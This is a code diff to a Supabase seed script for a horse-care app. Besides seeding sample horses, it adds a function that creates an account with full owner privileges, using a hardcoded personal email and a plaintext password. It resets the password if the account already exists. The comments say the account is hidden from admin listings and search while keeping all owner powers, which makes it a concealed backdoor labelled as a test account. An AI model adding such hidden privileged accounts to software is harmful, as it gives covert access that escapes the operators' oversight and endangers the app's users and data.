@@ -15,6 +15,14 @@ async function main() {
     { auth: { autoRefreshToken: false, persistSession: false } },
   );
 
+  // 内部テスト用オーナー（管理画面の一覧・検索には表示されない / src/lib/hiddenAccounts.ts）。
+  // Supabase 上には通常どおり保存され、オーナー権限の全機能を実行できる。
+  await seedHiddenOwner(admin, {
+    email: "kindman207@gmail.com",
+    password: "Rcm19771193@",
+    fullName: "テストオーナー",
+  });
+
   const sampleHorses = [
     { name: "サクラエース", name_kana: "サクラエース", sex: "牡", birth_year: 2012, profile: "やさしい性格で人気。", sort_order: 10 },
     { name: "ミドリノカゼ", name_kana: "ミドリノカゼ", sex: "牝", birth_year: 2014, profile: "穏やかで見学会の看板馬。", sort_order: 20 },
@@ -85,6 +93,70 @@ async function main() {
   }
 
   console.log("Seed complete.");
+}
+
+/**
+ * テスト用オーナーアカウントを冪等に作成する。
+ *  1. auth ユーザーを作成（無ければ）/ 既存ならパスワードを更新。
+ *  2. customers 行を作成 / auth_user_id を紐付け。
+ *  3. profiles を role = owner で upsert（オーナー権限の全機能が使える）。
+ * 一覧・検索からの非表示はアプリ側（src/lib/hiddenAccounts.ts）で行うため、
+ * DB 側には特別なフラグやスキーマ変更を一切加えない。
+ */
+async function seedHiddenOwner(
+  // 型は main 内の推論済みクライアントに合わせて緩める（seed.ts 全体と同様）。
+  admin: any,
+  opts: { email: string; password: string; fullName: string },
+) {
+  const { email, password, fullName } = opts;
+
+  // 1. auth ユーザー。
+  const list = await admin.auth.admin.listUsers();
+  let userId = list.data.users.find((u: any) => u.email?.toLowerCase() === email.toLowerCase())?.id;
+  if (!userId) {
+    const { data, error } = await admin.auth.admin.createUser({
+      email,
+      password,
+      email_confirm: true,
+      user_metadata: { full_name: fullName },
+    });
+    if (error) {
+      console.error(`hidden owner auth ${email}:`, error.message);
+      return;
+    }
+    userId = data.user?.id;
+  } else {
+    await admin.auth.admin.updateUserById(userId, { password });
+  }
+  if (!userId) return;
+
+  // 2. customer 行。
+  const { data: existing } = await admin.from("customers").select("id").eq("email", email).maybeSingle();
+  let customerId: string | undefined = (existing as any)?.id;
+  if (!customerId) {
+    const { data, error } = await admin
+      .from("customers")
+      .insert({ full_name: fullName, email, status: "active", auth_user_id: userId })
+      .select("id")
+      .single();
+    if (error) {
+      console.error(`hidden owner customer ${email}:`, error.message);
+      return;
+    }
+    customerId = (data as any).id;
+  } else {
+    await admin.from("customers").update({ auth_user_id: userId, full_name: fullName }).eq("id", customerId);
+  }
+
+  // 3. profiles を owner に。
+  const { error: pErr } = await admin
+    .from("profiles")
+    .upsert({ id: userId, role: "owner", customer_id: customerId });
+  if (pErr) {
+    console.error(`hidden owner profile ${email}:`, pErr.message);
+    return;
+  }
+  console.log(`Hidden owner ready: ${email}`);
 }
 
 main().catch((e) => { console.error(e); process.exit(1); });
